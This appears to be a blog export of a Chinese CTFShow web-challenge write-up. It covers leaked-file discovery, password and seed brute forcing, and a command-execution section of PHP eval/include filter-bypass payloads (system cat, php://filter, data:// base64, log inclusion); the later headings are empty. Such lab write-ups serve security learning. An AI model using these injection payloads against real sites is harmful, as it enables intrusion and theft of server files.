{"title":"","uid":"f73a8e23e6f6f669cf99c7dba8fa0722","slug":"CTFShow","date":"2022-11-25T07:32:45.415Z","updated":"2022-09-28T18:51:48.899Z","comments":true,"path":"api/articles/CTFShow.json","keywords":null,"cover":[],"content":"<p>CTFShow</p>\n<h1 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h1><h2 id=\"web1\"><a href=\"#web1\" class=\"headerlink\" title=\"web1\"></a>web1</h2><p>开发注释未及时删除 </p>\n<p>直接查看源码，flag在注释里</p>\n<h2 id=\"web2\"><a href=\"#web2\" class=\"headerlink\" title=\"web2\"></a>web2</h2><p>js前台拦截 === 无效操作</p>\n<p>浏览器禁用js或则Burp抓包</p>\n<h2 id=\"web3\"><a href=\"#web3\" class=\"headerlink\" title=\"web3\"></a>web3</h2><p>f12 网络在响应头里就有flag或者直接抓包</p>\n<h2 id=\"web4\"><a href=\"#web4\" class=\"headerlink\" title=\"web4\"></a>web4</h2><p>robots.txt文件泄露</p>\n<p>直接查看robots.txt</p>\n<p>robots.txt （统一小写）是一种存放于网站根目录下的ASCII编码的文本文件。</p>\n<p>常见的备份文件</p>\n<pre><code>.index.php.swp\nindex.php.swp\nindex.php.bak\n.index.php~\nindex.php.bak_Edietplus\nindex.php.~\nindex.php.1\nindex.php\nindex.php~\nindex.php.rar\nindex.php.zip\nindex.php.7z\nindex.php.tar.gz\nwww.zip\nwww.rar\nwww.zip\nwww.7z\nwww.tar.gz\nwww.tar\nweb.zip\nweb.rar\nweb.zip\nweb.7z\nweb.tar.gz\nweb.tar\nwwwroot.rar\nweb.rar\n</code></pre>\n<h2 id=\"web5\"><a href=\"#web5\" class=\"headerlink\" title=\"web5\"></a>web5</h2><p>phps文件泄露</p>\n<p>phps存放着php源码，可通过尝试访问/index.phps读取,或者尝试扫描工具扫描读取</p>\n<pre><code>php备份文件：后缀为php~或者index.php.bak\n\nphp的源代码文件：后缀为phps\n</code></pre>\n<h2 id=\"web6\"><a href=\"#web6\" class=\"headerlink\" title=\"web6\"></a>web6</h2><p>源码压缩包泄露</p>\n<p>直接访问<a href=\"http://www.zip,压缩包发现fl000g.txt,url+fl000g.txt访问/\">www.zip，压缩包发现fl000g.txt，url+fl000g.txt访问</a></p>\n<h2 id=\"web7\"><a href=\"#web7\" class=\"headerlink\" title=\"web7\"></a>web7</h2><p>版本控制泄露源码</p>\n<pre><code>git / svn\n</code></pre>\n<p>是由于运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候， .git 这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p>\n<p>访问 url/.git/ ，得到 flag 。</p>\n<p>.git文件泄露，当开发人员使用git控制版本时，如果操作不当，可能导致git流入线上环境，导致.git文件夹下的文件被访问，代码泄露，如.git/index文件可找到工程所有文件名和sha1文件,在git/objects下载导致危害</p>\n<p>类似的还有 .hg 源码泄露，由于 hg init 的时候生成 .hg 文件。</p>\n<h2 id=\"web8\"><a href=\"#web8\" class=\"headerlink\" title=\"web8\"></a>web8</h2><p>.svn泄露，svn是源代码管理系统，在管理代码的过程中，会生成一个.svn的隐藏文件，导致源码泄露（造成原因是在发布代码时没有使用导入功能，而是直接粘贴复制）</p>\n<p>访问 url/.svn/ ，得到 flag 。</p>\n<p>Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。</p>\n<h2 id=\"web9\"><a href=\"#web9\" class=\"headerlink\" title=\"web9\"></a>web9</h2><p>vim临时文件泄露</p>\n<p>如果vim编写时 不是正常退出 就会临时留下一个 后缀名为swp的文件 我们可以查看该文件<br>同时多次意外退出并<strong>不会覆盖旧的.swp文件</strong>，而是会生成一个新的，例如**.swo**文件。</p>\n<p>vim缓存泄露，在使用vim进行编辑时，会产生缓存文件，操作正常，则会删除缓存文件，如果意外退出，缓存文件保留下来，这是时可以通过缓存文件来得到原文件，以index.php来说，第一次退出后，缓存文件名为 .index.php.swp，第二次退出后，缓存文件名为.index.php.swo,第三次退出后文件名为.index.php.swn</p>\n<p>直接访问index.php.swp</p>\n<pre><code>一、vim备份文件\n\n     默认情况下使用Vim编程，在修改文件后系统会自动生成一个带~的备份文件，某些情况下可以对其下载进行查看；\n\n    eg:index.php普遍意义上的首页，输入域名不一定会显示。   它的备份文件则为index.php~\n\n二、vim临时文件\n\n    vim中的swp即swap文件，在编辑文件时产生，它是隐藏文件，如果原文件名是submit，则它的临时文件\n\n .submit.swp。如果文件正常退出，则此文件自动删除。\n</code></pre>\n<h2 id=\"web10\"><a href=\"#web10\" class=\"headerlink\" title=\"web10\"></a>web10</h2><p>cookie泄露，直接 F12 或 burp 抓包看cookie获取flag 。</p>\n<h2 id=\"web11\"><a href=\"#web11\" class=\"headerlink\" title=\"web11\"></a>web11</h2><p>域名txt记录泄露</p>\n<p>域名其实也可以隐藏信息，在线DNS域名解析，即可得到flag</p>\n<pre><code>https://whois.chinaz.com/\nhttp://www.jsons.cn/nslookup/\nhttps://zijian.aliyun.com/\n</code></pre>\n<h2 id=\"web12\"><a href=\"#web12\" class=\"headerlink\" title=\"web12\"></a>web12</h2><p>敏感信息公布</p>\n<p>url/admin/访问后台需要登陆</p>\n<p>猜测用户名为admin，密码为页面最下方联系电话号码，登录成功</p>\n<h2 id=\"web13\"><a href=\"#web13\" class=\"headerlink\" title=\"web13\"></a>web13</h2><p>内部技术文档泄露</p>\n<p>在页面最下方找到了document，点击进入发现是内部文档，通过后台地址以及用户名和密码登录获取flag</p>\n<h2 id=\"web14\"><a href=\"#web14\" class=\"headerlink\" title=\"web14\"></a>web14</h2><p>编辑器配置不当</p>\n<p>进入url/editor/</p>\n<p>插入文件-&gt;文件空间</p>\n<p>随便点点看看有没有可疑文件，最后发现tmp/html/nothinghere/fl000g.txt</p>\n<p>直接访问url+/nothinghere/fl000g.txt进入得到flag</p>\n<h2 id=\"web15\"><a href=\"#web15\" class=\"headerlink\" title=\"web15\"></a>web15</h2><p>密码逻辑脆弱</p>\n<p>进入url/admin/，需要用户名和密码登录，点击找回密码，需要填写所在地，在页面最下方有一个qq邮箱，通过qq号查询发现在西安，填写密保问题重置密码，登录成功获取flag</p>\n<h2 id=\"web16\"><a href=\"#web16\" class=\"headerlink\" title=\"web16\"></a>web16</h2><p>探针泄露</p>\n<pre><code>考察PHP探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag\n</code></pre>\n<p>访问/tz.php</p>\n<p>再点击进入phpinfo可以得到flag</p>\n<h2 id=\"web17\"><a href=\"#web17\" class=\"headerlink\" title=\"web17\"></a>web17</h2><p>备份SQL文件泄露</p>\n<p>backup.sql</p>\n<h2 id=\"web18\"><a href=\"#web18\" class=\"headerlink\" title=\"web18\"></a>web18</h2><p>js敏感信息泄露</p>\n<p>直接查看js代码，在分数大于100时，windows.confirm(一串uniciode编码)，将其转换为中文，得到110.php，获得flag</p>\n<h2 id=\"web19\"><a href=\"#web19\" class=\"headerlink\" title=\"web19\"></a>web19</h2><p>前端密钥泄露</p>\n<p>直接查看前端代码，在注释发现用户名和密码，直接登录失败，使用Burp发包，获得flag</p>\n<h2 id=\"web20\"><a href=\"#web20\" class=\"headerlink\" title=\"web20\"></a>web20</h2><p>mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加/db/db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag flag{ctfshow_old_database}</p>\n<h2 id=\"web21\"><a href=\"#web21\" class=\"headerlink\" title=\"web21\"></a>web21</h2><p>CDN穿透</p>\n<p>确定 IP 的话，直接 <strong>ping 域名</strong>，得到 IP</p>\n<p><img src=\"D:\\Documents\\CTFShow.assets\\image-20220927230417655.png\" alt=\"image-20220927230417655\"></p>\n<h1 id=\"爆破\"><a href=\"#爆破\" class=\"headerlink\" title=\"爆破\"></a>爆破</h1><h2 id=\"web21-1\"><a href=\"#web21-1\" class=\"headerlink\" title=\"web21\"></a>web21</h2><p><a href=\"https://www.cnblogs.com/007NBqaq/p/13220297.html\">tomcat 认证爆破之custom iterator使用 - 007NBqaq - 博客园 (cnblogs.com)</a></p>\n<p>抓包发现，随便输入的密码被base64编码，解码username:password</p>\n<p>对密码进行爆破，猜测用户名为admin:</p>\n<p><img src=\"D:\\Documents\\CTFShow.assets\\image-20220927234912376.png\" alt=\"image-20220927234912376\"></p>\n<p>爆破时要进行base64加密以及关掉默认的url编码</p>\n<p><img src=\"D:\\Documents\\CTFShow.assets\\image-20220927235837340.png\" alt=\"image-20220927235837340\"></p>\n<p>最后密码为shark63，获取flag</p>\n<h2 id=\"web22\"><a href=\"#web22\" class=\"headerlink\" title=\"web22\"></a>web22</h2><p>子域名爆破</p>\n<p>使用域名挖掘机</p>\n<h2 id=\"web23\"><a href=\"#web23\" class=\"headerlink\" title=\"web23\"></a>web23</h2><pre><code>substr(string,start,length)\n</code></pre>\n<p><img src=\"D:\\Documents\\CTFShow.assets\\image-20220928203659084.png\" alt=\"image-20220928203659084\"></p>\n<p>打开就是一段代码，手动写一段脚本爆破</p>\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang='en'&gt;\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width,initial-scale=1.0\"&gt;\n    &lt;title&gt;Document&lt;/title&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n    &lt;?php    \n    for ($i = 0; $i &lt; 1000; $i = $i + 1) {\n        $token = md5($i);\n        if (substr($token, 1, 1) === substr($token, 14, 1) &amp;&amp; substr($token, 14, 1) === substr($token, 17, 1)) {\n            if ((intval(substr($token, 1, 1)) + intval(substr($token, 14, 1)) + substr($token, 17, 1)) / substr($token, 1, 1) === intval(substr($token, 31, 1))) {\n                echo $i;\n            }\n        }\n    }\n    ?&gt;\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre>\n<h2 id=\"web24\"><a href=\"#web24\" class=\"headerlink\" title=\"web24\"></a>web24</h2><p>mt_srand伪随机数</p>\n<p>mt_srand函数只要规定了种子，其得到的伪随机数就是确定的，因此，我们自行构造一个和其种子一样的代码</p>\n<p>mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机 数。 提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数 因此不需要播种，并且如果设置了 seed参数 生成的随机数就是伪随机数，意思就是每次生成的随机数 是一样的</p>\n<p><img src=\"D:\\Documents\\CTFShow.assets\\image-20220928204151045.png\" alt=\"image-20220928204151045\"></p>\n<pre><code>&lt;?php\n        mt_srand(372619038);    \n        echo intval(mt_rand());\n?&gt;\n</code></pre>\n<h2 id=\"web25\"><a href=\"#web25\" class=\"headerlink\" title=\"web25\"></a>web25</h2><p>mtrand()随机数生成漏洞</p>\n<pre><code>include(\"flag.php\");\nif(isset($_GET['r'])){\n    $r = $_GET['r'];\n    mt_srand(hexdec(substr(md5($flag), 0,8)));\n    $rand = intval($r)-intval(mt_rand());//当r取0的时候就可以得到mt_rand()的值\n    if((!$rand)){\n        if($_COOKIE['token']==(mt_rand()+mt_rand())){\n            echo $flag;\n        }\n    }else{\n        echo $rand;\n    }\n}else{\n    highlight_file(__FILE__);\n    echo system('cat /proc/version');\n}\n</code></pre>\n<p><img src=\"D:\\Documents\\CTFShow.assets\\image-20220928213416452.png\" alt=\"image-20220928213416452\"></p>\n<p>使用<a href=\"https://www.openwall.com/php_mt_seed/\">php_mt_seed - MT_RAND（）种子饼干 (openwall.com)</a>爆破出种子</p>\n<p><img src=\"D:\\Documents\\CTFShow.assets\\image-20220928213505637.png\" alt=\"image-20220928213505637\"></p>\n<p>最后可以得到，这三个mt_rand()的值都不一样</p>\n<pre><code>&lt;?php\n        mt_srand(2414568491);    \n        echo mt_rand().\"\\n\";\n        echo mt_rand()+mt_rand();\n\n  ?&gt;\n</code></pre>\n<p>然后通过burp发包获取flag</p>\n<p><img src=\"D:\\Documents\\CTFShow.assets\\image-20220928213555669.png\" alt=\"image-20220928213555669\"></p>\n<h2 id=\"web26\"><a href=\"#web26\" class=\"headerlink\" title=\"web26\"></a>web26</h2><p>抓包后直接发包得到flag</p>\n<p><img src=\"D:\\Documents\\CTFShow.assets\\image-20220928214037577.png\" alt=\"image-20220928214037577\"></p>\n<h2 id=\"web27\"><a href=\"#web27\" class=\"headerlink\" title=\"web27\"></a>web27</h2><p>爆破生日日期</p>\n<p>可以获取录取名单，得到姓名和缺少出生日期的身份证号码</p>\n<p><img src=\"D:\\Documents\\CTFShow.assets\\image-20220928215007830.png\" alt=\"image-20220928215007830\"></p>\n<p>在查询页面发包</p>\n<p><img src=\"D:\\Documents\\CTFShow.assets\\image-20220928215202881.png\" alt=\"image-20220928215202881\"></p>\n<p>抓取后进行爆破</p>\n<p><img src=\"D:\\Documents\\CTFShow.assets\\image-20220928215240537.png\" alt=\"image-20220928215240537\"></p>\n<p><img src=\"D:\\Documents\\CTFShow.assets\\image-20220928215615461.png\" alt=\"image-20220928215615461\"></p>\n<p>最后得到正确的日期</p>\n<p><img src=\"D:\\Documents\\CTFShow.assets\\image-20220928215722154.png\" alt=\"image-20220928215722154\"></p>\n<p>登录获取flag</p>\n<h2 id=\"web28\"><a href=\"#web28\" class=\"headerlink\" title=\"web28\"></a>web28</h2><p>提示爆破目录</p>\n<p>通过暴力破解目录/0-100/0-100/看返回数据包</p>\n<p>爆破的时候去掉2.txt 仅仅爆破目录即可</p>\n<p><img src=\"D:\\Documents\\CTFShow.assets\\image-20220928220633875.png\" alt=\"image-20220928220633875\"></p>\n<p><img src=\"D:\\Documents\\CTFShow.assets\\image-20220928220626441.png\" alt=\"image-20220928220626441\"></p>\n<p><img src=\"D:\\Documents\\CTFShow.assets\\image-20220928225002149.png\" alt=\"image-20220928225002149\"></p>\n<h1 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a>命令执行</h1><h2 id=\"web29\"><a href=\"#web29\" class=\"headerlink\" title=\"web29\"></a>web29</h2><pre><code>preg_match 执行一个正则表达式匹配\n</code></pre>\n<pre><code>&lt;?php\n//模式分隔符后的\"i\"标记这是一个大小写不敏感的搜索\nif (preg_match(\"/php/i\", \"PHP is the web scripting language of choice.\")) {\n    echo \"查找到匹配的字符串 php。\";\n} else {\n    echo \"未发现匹配的字符串 php。\";\n}\n?&gt;\n</code></pre>\n<pre><code>error_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n</code></pre>\n<pre><code>首先执行ls命令，利用system\n?c=system(ls);\n得到两个文件 flag.php和index.php\n用cat命令读取flag.php，因为过滤了flag所以使用通配符\n?c=system('cat fla*.php');\n?c=system(\"nl fla?????\");\n?c=echo `nl fl''ag.php`;或者c=echo `nl fl“”ag.php`;\n?c=echo `nl fl\\ag.php`;//转义字符绕过\n?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php\n?c=eval($_GET[1]);&amp;1=system('nl flag.php');\n?c=awk '{printf $0}' flag.php||\n?c=$a=\"fla\";$b=\"g.php\";echo%20file_get_contents($a.$b);\n</code></pre>\n<pre><code>linux文件内容查看命令\ncat、tac、nl、more、less、head、tail、``\n</code></pre>\n<pre><code>通配符\n*可以通配多个字符\n?可以通配一个字符\n</code></pre>\n<h2 id=\"web30\"><a href=\"#web30\" class=\"headerlink\" title=\"web30\"></a>web30</h2><p>过滤了flag、system、php</p>\n<pre><code>error_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n</code></pre>\n<p>可以使用其他函数</p>\n<pre><code>system()\npassthru()\nexec()\nshell_exec()\npopen()\nproc_open()\npcntl_exec()\n反引号 同shell_exec()\n</code></pre>\n<pre><code>c=echo exec('nl fla?????');\nc=echo `nl fla''g.p''hp`;\nc=echo `nl fla?????`;\n</code></pre>\n<h2 id=\"web31\"><a href=\"#web31\" class=\"headerlink\" title=\"web31\"></a>web31</h2><pre><code>error_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n</code></pre>\n<pre><code>c=eval($_GET[1]);&amp;1=system('nl flag.php');//只过滤了c，1可以继续使用空格\nc=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));\nc=show_source(next(array_reverse(scandir(pos(localeconv())))));\nc=echo(`nl%09fl[abc]*`);//%09就是tab,[abc]也是正则的一种\nc=\"\\x73\\x79\\x73\\x74\\x65\\x6d\"(\"nl%09fl[a]*\");等价于system()\nc=echo`strings%09f*`;\nc=echo`strings\\$IFS\\$9f*`必须加转义字符\n</code></pre>\n<pre><code>show_source(next(array_reverse(scandir(pos(localeconv())))));\n\nscandir('.')这个函数的作用是扫描当前目录\nlocaleconv()函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.\npos()/current()函数返回数组第一个值\narray_reverse()是将数组颠倒\nnext()将数组指针一项下一位\nshow_source()的意思是读取函数内容\n</code></pre>\n<h2 id=\"web32\"><a href=\"#web32\" class=\"headerlink\" title=\"web32\"></a>web32</h2><pre><code>if(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n</code></pre>\n<pre><code>c=$nice=include$_GET[\"url\"]?&gt;&amp;url=php://filter/read=convert.base64-\nencode/resource=flag.php\n//include可以不用括号，后面直接跟变量不用空格，分号可以用?&gt;代替\n//利用filter协议读文件，将flag.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。使用的convert.base64-encode，就是一种过滤器。\n</code></pre>\n<pre><code>data伪协议\n把一些体量比较小的数据直接嵌入在页面里，而不使用外部链接。data:text/plain是嵌入文本\nc=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(\"cat flag.php\");?&gt;\nc=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==\n</code></pre>\n<h2 id=\"web33\"><a href=\"#web33\" class=\"headerlink\" title=\"web33\"></a>web33</h2><pre><code>if(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\\"/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n</code></pre>\n<pre><code>c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-\nencode/resource=flag.php\n\nc=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(\"cat flag.php\");?&gt;\n</code></pre>\n<h2 id=\"web34\"><a href=\"#web34\" class=\"headerlink\" title=\"web34\"></a>web34</h2><pre><code>if(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n</code></pre>\n<h2 id=\"web35\"><a href=\"#web35\" class=\"headerlink\" title=\"web35\"></a>web35</h2><p>同上</p>\n<h2 id=\"web36\"><a href=\"#web36\" class=\"headerlink\" title=\"web36\"></a>web36</h2><pre><code>if(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"|\\&lt;|\\=|\\/|[0-9]/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n</code></pre>\n<pre><code>c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php\n\nc=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(\"cat flag.php\");?&gt;\n</code></pre>\n<h2 id=\"web37\"><a href=\"#web37\" class=\"headerlink\" title=\"web37\"></a>web37</h2><pre><code>if(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag/i\", $c)){\n        include($c);\n        echo $flag;\n    \n    }\n        \n}else{\n    highlight_file(__FILE__);\n}\n</code></pre>\n<pre><code>/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg== //&lt;?php system('cat flag.php');?&gt;\n\n/?c=data://text/plain,&lt;?php system('cat fla*');?&gt;\n\n还可以配合UA头执行日志包含\nc=/var/log/nginx/access.log\n</code></pre>\n<h2 id=\"web38\"><a href=\"#web38\" class=\"headerlink\" title=\"web38\"></a>web38</h2><pre><code>if(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|php|file/i\", $c)){\n        include($c);\n        echo $flag;\n    \n    }\n        \n}else{\n    highlight_file(__FILE__);\n}\n</code></pre>\n<pre><code>/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==\n\n也可以日志包含\nc=/var/log/nginx/access.log\n</code></pre>\n<h2 id=\"web39\"><a href=\"#web39\" class=\"headerlink\" title=\"web39\"></a>web39</h2><p>data://text/plain, 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么作用</p>\n<pre><code>if(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag/i\", $c)){\n        include($c.\".php\");\n    }\n        \n}else{\n    highlight_file(__FILE__);\n}\n</code></pre>\n<pre><code>/?c=data://text/plain,&lt;?php system('cat fla*');?&gt;\n??为什么base64不行\n</code></pre>\n<h2 id=\"web40\"><a href=\"#web40\" class=\"headerlink\" title=\"web40\"></a>web40</h2><pre><code>if(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\'|\\\"|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i\", $c)){\n        eval($c);\n    }\n        \n}else{\n    highlight_file(__FILE__);\n}\n</code></pre>\n<pre><code>\n</code></pre>\n<h2 id=\"web41\"><a href=\"#web41\" class=\"headerlink\" title=\"web41\"></a>web41</h2><h2 id=\"web42\"><a href=\"#web42\" class=\"headerlink\" title=\"web42\"></a>web42</h2><h2 id=\"web43\"><a href=\"#web43\" class=\"headerlink\" title=\"web43\"></a>web43</h2><h2 id=\"web44\"><a href=\"#web44\" class=\"headerlink\" title=\"web44\"></a>web44</h2><h2 id=\"web45\"><a href=\"#web45\" class=\"headerlink\" title=\"web45\"></a>web45</h2><h2 id=\"web46\"><a href=\"#web46\" class=\"headerlink\" title=\"web46\"></a>web46</h2><h2 id=\"web47\"><a href=\"#web47\" class=\"headerlink\" title=\"web47\"></a>web47</h2><h2 id=\"web48\"><a href=\"#web48\" class=\"headerlink\" title=\"web48\"></a>web48</h2><h2 id=\"web49\"><a href=\"#web49\" class=\"headerlink\" title=\"web49\"></a>web49</h2><h2 id=\"web50\"><a href=\"#web50\" class=\"headerlink\" title=\"web50\"></a>web50</h2><h2 id=\"web51\"><a href=\"#web51\" class=\"headerlink\" title=\"web51\"></a>web51</h2><h2 id=\"web52\"><a href=\"#web52\" class=\"headerlink\" title=\"web52\"></a>web52</h2><h2 id=\"web53\"><a href=\"#web53\" class=\"headerlink\" title=\"web53\"></a>web53</h2><h2 id=\"web54\"><a href=\"#web54\" class=\"headerlink\" title=\"web54\"></a>web54</h2><h2 id=\"web55\"><a href=\"#web55\" class=\"headerlink\" title=\"web55\"></a>web55</h2><h2 id=\"web56\"><a href=\"#web56\" class=\"headerlink\" title=\"web56\"></a>web56</h2><h2 id=\"web57\"><a href=\"#web57\" class=\"headerlink\" title=\"web57\"></a>web57</h2><h2 id=\"web58\"><a href=\"#web58\" class=\"headerlink\" title=\"web58\"></a>web58</h2><h2 id=\"web59\"><a href=\"#web59\" class=\"headerlink\" title=\"web59\"></a>web59</h2><h2 id=\"web60\"><a href=\"#web60\" class=\"headerlink\" title=\"web60\"></a>web60</h2>","text":"CTFShow 信息收集web1开发注释未及时删除 直接查看源码，flag在注释里 web2js前台拦截 === 无效操作 浏览器禁用js或则Burp抓包 web3f12 网络在响应头里就有flag或者直接抓包 web4robots.txt文件泄露 直接查看robots.txt ...","link":"","photos":[],"count_time":{"symbolsCount":"10k","symbolsTime":"9 mins."},"categories":[],"tags":[],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86\"><span class=\"toc-text\">信息收集</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web1\"><span class=\"toc-text\">web1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web2\"><span class=\"toc-text\">web2</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web3\"><span class=\"toc-text\">web3</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web4\"><span class=\"toc-text\">web4</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web5\"><span class=\"toc-text\">web5</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web6\"><span class=\"toc-text\">web6</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web7\"><span class=\"toc-text\">web7</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web8\"><span class=\"toc-text\">web8</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web9\"><span class=\"toc-text\">web9</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web10\"><span class=\"toc-text\">web10</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web11\"><span class=\"toc-text\">web11</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web12\"><span class=\"toc-text\">web12</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web13\"><span class=\"toc-text\">web13</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web14\"><span class=\"toc-text\">web14</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web15\"><span class=\"toc-text\">web15</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web16\"><span class=\"toc-text\">web16</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web17\"><span class=\"toc-text\">web17</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web18\"><span class=\"toc-text\">web18</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web19\"><span class=\"toc-text\">web19</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web20\"><span class=\"toc-text\">web20</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web21\"><span class=\"toc-text\">web21</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E7%88%86%E7%A0%B4\"><span class=\"toc-text\">爆破</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web21-1\"><span class=\"toc-text\">web21</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web22\"><span class=\"toc-text\">web22</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web23\"><span class=\"toc-text\">web23</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web24\"><span class=\"toc-text\">web24</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web25\"><span class=\"toc-text\">web25</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web26\"><span class=\"toc-text\">web26</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web27\"><span class=\"toc-text\">web27</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web28\"><span class=\"toc-text\">web28</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C\"><span class=\"toc-text\">命令执行</span></a><ol class=\"toc-child\"><li 